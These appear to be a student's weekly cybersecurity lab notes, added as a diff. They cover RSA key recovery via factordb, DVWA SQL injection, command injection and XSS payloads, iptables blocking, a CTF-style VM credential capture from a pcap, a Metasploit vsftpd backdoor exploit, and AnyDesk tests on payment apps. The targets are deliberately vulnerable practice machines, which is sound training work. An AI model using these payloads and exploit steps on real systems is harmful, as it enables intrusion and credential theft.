@@ -1,0 +1,203 @@
+week-2
+
+create a folder named rsa
+store two files enc.txt,pubkey.pem
+
+>cat pubkey.pem
+>openssl rsa -pubin -inform PEM -text -noout < pubkey.pem
+>copy the hexa decimal and goto hexadecimal to decimal converter and paste it to get decimal number
+>now take the decimal consider it as "N" and the exponent as "E" 
+>In factordb.com paste the n value to get two number and consider them as "P" "Q"
+>touch exploit.py
+
+pip I pycryptodome
+
+from Crypto.Util.number import inverse
+from Crypto.PublicKey import RSA
+import base64
+
+p=value
+q=value
+n=value
+e=value
+
+num=(p-1)*(q-1)
+d=inverse(e,num)
+key=RSA.construct((n,e,d,p,q))
+fn="private.pem"
+with open(fn,"wb") as f:
+	f.write(key.exportKey())
+
+>python exploit.py
+>openssl pkeyutl -decrypt -in enc.txt -out dec.text -inkey private.pem
+
+
+
+week3
+
+> /var/www/html
+> sudo git clone www.digininja.com/DVWA.git
+ downloaging the data .... (25/134)
+> ls
+  index.html DVWA index_nginx_debian.html
+> sudo mv DVWA dvwa
+> sudo chmod -R 777 dvwa
+> cd dvwa
+> cd config
+> sudo cp config.inc.php.dist config.inc.php
+> sudo nano config.inc.php
+  set db_user: admin
+  set db_password: password
+  ctrl+s ctrl+x
+> sudo service mysql start
+> sudo mysql -u root -p
+ 	(MariaDB)>create database admin;
+	(MariaDB)>create user@localhost identified by 'password'
+	(MariaDB)>grant all on dvwa.* to admin@localhost;
+> cd /etc
+> cd php
+> cd 8.2
+> cd apache2
+>sudo nano php.ini
+> sudo service apache2 start
+ --> Now goto http://127.0.0.1/dvwa/login.php
+ --> give the username as admin and password as password 
+ --> In DVWA Security set impossible to low and submit
+ --> Go to SQL Injection and type 1 enter
+ --> type 2 enter
+ --> type %'or'1'='1
+
+week4
+
+> sudo service apache2 start
+> goto DVWA Security and set impossible to low and submit
+> now goto command Injection and do
+  --> 127.0.0.1;ls
+  --> 127.0.0.1;ls../
+  --> 127.0.0.1;cat ../view_source.php
+  --> 127.0.0.1&&net user
+  --> 127.0.0.1&net user
+> go to cmd
+  > ping 0.0.0.0&&net user
+  > ping 0.0.0.0&net user
+ 
+--> Now goto XSS(Reflected) and in the text box give 
+	type hello word
+	--> hello hello world
+	type <script>alert<'hello world'></script>
+	--> It shows a pop with hello world and click ok
+
+--> Now crf>And change the password with new password and select the change button or login or submit
+	> click on the test_credential and give username and new username 
+	--> the username admin is valid
+
+Week5
+now goto kali
+> ifconfig
+> sudo service apache2 start
+   -->password: kali
+
+In cmd 
+> ipconfig 
+   --> it shows bunch of ipaddress and now ipv4 address(any one of them mainly Lanless or ethernet VMware (net1 or 8)
+
+In kali
+> sudo iptables -A INPUT -s <ip_address> -j DROP  (to block the ping packets in windows)
+Now goto cmd
+> ping <ip_address of kali>
+  --> timeout timeout timeout   (if you can open localhost in windows to check)
+
+In kalie (to unblock)
+> sudo iptables -D INPUT -s <ip_address> -j DROP
+
+To Block the ports
+> sudo iptables -A INPUT -s <ip_address> -p tcp --destination-port 80 -j DROP
+
+To Unblock the ports
+> sudo iptables -D INPUT -s <ip_address> -p tcp --destination-port 80 -j DROP
+
+
+week7
+
+Go to rampriyakhilari github and download the CMROS.zip file and extract it in a folder and load the .ovf file in VMware
+
+and give login enter  
+	--> copy the ip_address of it
+	--> It asks username and password
+Now goto Zenmap or nmap 
+and enter the scap and choose option to "scan all tcp ports"
+ then copy the port 13652
+
+Now go to kali linux default page by entering the ip_address in URL of firefox (in kali)
+Right Click and select the View Page Source and copy the username and password to be test test
+
+and goto vmware of CMROS and type login and enter and give 
+---> username:test
+---> password:test
+
+Now goto winScp and enter the the protocol as Scp instead of SFTP
+and give host name:ip_address
+port: 13652
+username:test
+password:test
+Click on the Login button 
+and copy the cap.pcapng file to the desktop folder in kali and open it with WireShark 
+	--> It give bunch of ip address but Right click the any tcp ip_address and select follow and only option it has
+	--> It gives the credentials i.e., username and password so like root and 5grvvbfru (like that) so copy them
+Go to vmware of CMROS
+and type login and enter and
+	--> username:root
+	-->passoword:5g3rvvfbvgo234
+so after entering the terminal 
+> cd home/test/Desktop
+> ls
+cap.pcapng s3cr3t.txt
+>cat s3cr3t.txt
+ofgbvorhfngtihjyirt9ue8ygdfgbjhu9pjo
+
+===completed the week7===
+
+week 8
+
+---> Download the metasploit and open it with VMware and 
+	enter the username:msfadmin
+	enter the password:msfadmin
+	copy its <ip_address>
+---> Now goto kali in VMware and in terminal
+> msfconsole
+msf6> search vsftpd
+msf6> use exploit/unix/ftp/vsftpd-234-backdoor
+msf6> info
+msf6> set RHOST <ip_address> 
+msf6> info
+msf6> show payloads
+msf6> set payload payload/cmd/unix/interact
+msf6> exploit
+.
+.
+.
+(*) Found Shell
+	> ls
+	> cat nonup.out
+	-->fngvrioaeht592u428y5bgft8ayh
+
+===Completed Week8===
+
+
+Week 9
+
+---> select .txt file and malware.rar file and upload them in filescan.io and observe the result
+---> then open virustotal.com and upload both files again in them and observe the results
+
+Week10
+---> download the AnyDesk app in computer and mobile phone 
+---> enter the id of mobile phone and connect the phone to computer through AnyDesk and allow screen sharing
+---> Download the upi applications and try to payments and them
+
+---> phonepe -> allow the app to open and show the interface but doesn't allow payments due to screen sharing (medium security)
+     google pay -> allow the app open and do the payments while the screen sharing is ON
+     paytm -> doesn't allow the app to open due to screen sharing is ON
+
+ 
+
+
